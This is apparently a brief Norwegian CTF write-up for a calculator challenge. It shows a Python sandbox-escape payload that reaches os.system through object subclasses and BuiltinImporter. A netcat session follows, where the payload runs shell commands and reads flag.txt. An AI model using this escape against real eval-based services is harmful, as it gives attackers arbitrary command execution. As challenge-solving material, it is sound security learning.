Testet egentlig bare med samme payload som i `Kalkulator #1` og det viste seg å fungere:

Payload:
```python
[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("echo pwned")
```

Testing:

```bash
$ nc ctf.uiactf.no 4004
Welcome to the calculator!
> [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("echo pwned")
pwned
0
> [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag.txt")
UIACTF{brukerinput er fortsatt farlig å evaluere}
0
>
```

Det finnes tydeligvis en lettere måte å utnytte sårbarheten i `Kalkulator #1` da regner jeg med. 🤷🏻‍♂️

## Flagg

`UIACTF{brukerinput er fortsatt farlig å evaluere}`
